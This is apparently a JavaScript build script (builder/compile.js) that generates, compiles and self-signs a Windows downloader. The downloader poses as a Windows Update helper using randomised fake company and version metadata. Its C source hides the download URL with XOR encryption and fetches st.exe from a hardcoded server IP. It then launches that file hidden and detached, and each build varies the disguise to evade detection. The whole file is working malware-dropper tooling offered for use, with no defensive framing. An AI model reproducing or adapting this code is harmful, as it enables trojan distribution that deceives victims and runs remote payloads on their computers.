// language: JavaScript, file: builder/compile.js
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { execFile, execSync } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';

const execFileP = promisify(execFile);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';

function makeRng(seed) {
  let s = (seed >>> 0) || 1;
  return {
    next() {
      s = (s + 0x6D2B79F5) | 0;
      let t = Math.imul(s ^ (s >>> 15), 1 | s);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    },
    int(max) { return Math.floor(this.next() * max); },
    pick(arr) { return arr[this.int(arr.length)]; },
    hex(len) {
      const chars = '0123456789abcdef';
      let out = '';
      for (let i = 0; i < len; i++) out += chars[this.int(16)];
      return out;
    },
  };
}

const COMPANIES = ['Acme Software Inc.', 'Contoso Ltd.', 'Initech Systems', 'Globex Corporation', 'Northwind Traders', 'Umbrella Data Systems', 'Stark Industries', 'Wayne Enterprises', 'Cyberdyne Systems', 'Soylent Corp', 'Tyrell Corporation', 'Wonka Industries'];
const PRODUCTS = ['Update Helper', 'System Updater', 'Security Assistant', 'Network Utility', 'Runtime Manager', 'Driver Updater', 'Component Service', 'Platform Sync', 'Data Assistant', 'Windows Helper'];
const FILE_DESCRIPTIONS = ['Windows Update Helper', 'System Maintenance Utility', 'Background Update Service', 'Network Sync Helper', 'Component Update Agent', 'System Resource Manager'];
const INTERNAL_NAMES = ['wuauclt', 'wupdater', 'syshelper', 'updater', 'syssync', 'svcman', 'helper', 'diaghost', 'winsupd'];
const COPYRIGHT_YEARS = ['2019', '2020', '2021', '2022', '2023', '2024', '2025'];

export function randomBuildMeta(seed) {
  const rng = makeRng(seed);
  const build = 19041 + rng.int(300);
  const patch = rng.int(1000);
  const version = `10.0.${build}.${patch}`;
  const versionComma = `10,0,${build},${patch}`;
  const xorKey = 1 + rng.int(254);

  return {
    seed,
    company: rng.pick(COMPANIES),
    product: rng.pick(PRODUCTS),
    fileDesc: rng.pick(FILE_DESCRIPTIONS),
    internalName: rng.pick(INTERNAL_NAMES),
    version,
    versionComma,
    copyright: `Copyright (C) ${rng.pick(COPYRIGHT_YEARS)} ${rng.pick(COMPANIES)}`,
    xorKey,
  };
}

function encryptStr(str, key) {
  const buf = Buffer.from(str, 'ascii');
  const enc = [];
  for (let i = 0; i < buf.length; i++) {
    enc.push(`0x${(buf[i] ^ key).toString(16).padStart(2, '0')}`);
  }
  return `{ ${enc.join(', ')} }`;
}

function cSource(meta, key, ip, buildId) {
  const stUrl = `http://${ip}/api/downloads/st.exe`;
  const esc4c = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  
  const encStUrl = encryptStr(stUrl, meta.xorKey);
  const safeKey = esc4c(key);

  return String.raw`
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "winhttp.lib")

static const char ACCOUNT_KEY[] = "${safeKey}";

static void decrypt(char* buf, int len, unsigned char key) {
    for (int i = 0; i < len; i++) buf[i] ^= key;
}

static int is_valid_pe(const wchar_t* p) {
    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    IMAGE_DOS_HEADER dos;
    DWORD rd = 0;
    if (!ReadFile(h, &dos, sizeof(dos), &rd, NULL) || rd != sizeof(dos) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(h); return 0;
    }
    SetFilePointer(h, dos.e_lfanew, NULL, FILE_BEGIN);
    DWORD nt_sig = 0;
    if (!ReadFile(h, &nt_sig, sizeof(nt_sig), &rd, NULL) || rd != sizeof(nt_sig) || nt_sig != IMAGE_NT_SIGNATURE) {
        CloseHandle(h); return 0;
    }
    CloseHandle(h);
    return 1;
}

static int download_file(const wchar_t* url, const wchar_t* dest) {
    URL_COMPONENTS uc = {0}; uc.dwStructSize = sizeof(uc);
    wchar_t host[256] = {0}; wchar_t path[1024] = {0};
    uc.lpszHostName = host; uc.dwHostNameLength = 256;
    uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
    
    if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
        printf("[-] WinHttpCrackUrl failed: %lu\n", GetLastError());
        return 0;
    }

    printf("[+] Connecting to %ls:%d%ls...\n", host, uc.nPort, path);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("[-] WinHttpOpen failed: %lu\n", GetLastError());
        return 0;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
    if (!hConnect) {
        printf("[-] WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return 0;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        printf("[-] WinHttpOpenRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    printf("[+] Sending request...\n");
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        printf("[-] WinHttpSendRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        printf("[-] WinHttpReceiveResponse failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    printf("[+] Response received. Writing file...\n");
    HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFileW failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    DWORD dwSize = 0, dwDownloaded = 0;
    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
        if (dwSize == 0) break;
        BYTE* pBuffer = (BYTE*)malloc(dwSize);
        if (pBuffer) {
            if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
                DWORD written = 0;
                WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
            }
            free(pBuffer);
        }
    } while (dwSize > 0);
    
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
}

int main() {
    printf("[+] Starting boot.exe...\n");
    Sleep(1500); 

    wchar_t appdata[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata))) return 1;
    
    wchar_t dir[MAX_PATH], keyPath[MAX_PATH], stPath[MAX_PATH], stNewPath[MAX_PATH];
    _snwprintf(dir,      MAX_PATH, L"%ls\\loader", appdata);
    _snwprintf(keyPath,  MAX_PATH, L"%ls\\key.json", dir);
    _snwprintf(stPath,   MAX_PATH, L"%ls\\st.exe",   dir);
    _snwprintf(stNewPath,MAX_PATH, L"%ls\\st_new.exe", dir);
    
    CreateDirectoryW(dir, NULL);

    printf("[+] Writing key.json...\n");
    HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hKey != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hKey, "{\"key\":\"", 8, &w, NULL);
        WriteFile(hKey, ACCOUNT_KEY, (DWORD)strlen(ACCOUNT_KEY), &w, NULL);
        WriteFile(hKey, "\"}", 2, &w, NULL);
        CloseHandle(hKey);
    }

    printf("[+] Checking for existing st.exe...\n");
    int need_st = !is_valid_pe(stPath);
    if (need_st) {
        printf("[+] st.exe missing. Downloading...\n");
        char stUrlStr[128] = {0};
        wchar_t stUrlW[128] = {0};
        const char encStUrl[] = ${encStUrl};
        
        decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
        MultiByteToWideChar(CP_ACP, 0, stUrlStr, -1, stUrlW, 128);

        if (download_file(stUrlW, stNewPath) && is_valid_pe(stNewPath)) {
            printf("[+] Download successful! Moving file...\n");
            DeleteFileW(stPath);
            MoveFileW(stNewPath, stPath);
            need_st = 0;
        }
    }

    if (need_st) {
        printf("[-] Download failed. Exiting...\n");
        Sleep(5000);
        return 1; 
    }

    printf("[+] Launching st.exe...\n");
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    wchar_t cmd[MAX_PATH];
    _snwprintf(cmd, MAX_PATH, L"\"%ls\"", stPath);
    
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS,
                   NULL, dir, &si, &pi);
                   
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
    
    printf("[+] Done. Exiting in 3 seconds...\n");
    Sleep(3000);
    return 0;
}
`;
}

function rcSource(meta) {
  const esc4rc = (s) => String(s).replace(/"/g, '""');
  return `
#include <windows.h>
1 ICON "icon.ico"
VS_VERSION_INFO VERSIONINFO
FILEVERSION     ${meta.versionComma}
PRODUCTVERSION  ${meta.versionComma}
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "${esc4rc(meta.company)}"
            VALUE "FileDescription",  "${esc4rc(meta.fileDesc)}"
            VALUE "FileVersion",      "${meta.version}"
            VALUE "InternalName",     "${meta.internalName}"
            VALUE "OriginalFilename", "${meta.internalName}.exe"
            VALUE "ProductName",      "${esc4rc(meta.product)}"
            VALUE "ProductVersion",   "${meta.version}"
            VALUE "LegalCopyright",   "${esc4rc(meta.copyright)}"
        END
    END
END
`;
}

export async function compileLauncher({ key, config, baseExe, buildId }) {
  const ip = (config && config.ip) || process.env.SERVER_IP || '95.182.96.216';
  const seed = ((buildId >>> 0) * 2654435761 ^ crypto.randomBytes(4).readUInt32LE(0)) >>> 0;
  const meta = randomBuildMeta(seed);

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const cPath   = path.join(workDir, 'launcher.c');
  const rcPath  = path.join(workDir, 'app.rc');
  const resPath = path.join(workDir, 'app.res');
  const outPath = path.join(workDir, 'launcher.exe');
  const signedPath = path.join(workDir, 'launcher_signed.exe');
  const keyPath = path.join(workDir, 'key.pem');
  const certPath = path.join(workDir, 'cert.pem');

  fs.writeFileSync(cPath, cSource(meta, key, ip, buildId));
  fs.writeFileSync(rcPath, rcSource(meta));

  const iconSrc = path.join(__dirname, '..', 'icon.ico');
  if (fs.existsSync(iconSrc)) {
    fs.copyFileSync(iconSrc, path.join(workDir, 'icon.ico'));
  } else {
    fs.writeFileSync(path.join(workDir, 'icon.ico'),
      Buffer.from('00000100010001010000010018003000000016000000280000000100000002000000010018000000000000000000000000000000000000000000000000000000000000000000', 'hex'));
  }

  try {
    await execFileP(WINDRES, ['-I', workDir, '-i', rcPath, '-o', resPath,
                              '--input-format=rc', '--output-format=coff'],
                    { cwd: workDir, timeout: 30_000 });
    
    // CHANGED TO -mconsole SO YOU CAN SEE THE DEBUG OUTPUT
    await execFileP(CC, ['-O2', '-s', '-mconsole', '-o', outPath, cPath, resPath,
                         '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32', '-lwinhttp'],
                    { cwd: workDir, timeout: 60_000 });

    console.log('[launcher] self-signing binary...');
    try {
      execSync(`openssl req -x509 -newkey rsa:2048 -keyout ${keyPath} -out ${certPath} -days 365 -nodes -subj "/CN=${meta.company}/O=${meta.company}/C=US"`, { stdio: 'ignore' });
      execSync(`osslsigncode sign -certs ${certPath} -key ${keyPath} -n "${meta.product}" -i https://${ip}/ -in ${outPath} -out ${signedPath}`, { stdio: 'ignore' });
      return fs.readFileSync(signedPath);
    } catch (e) {
      console.warn('[launcher] signing failed, returning unsigned', e.message);
      return fs.readFileSync(outPath);
    }

  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}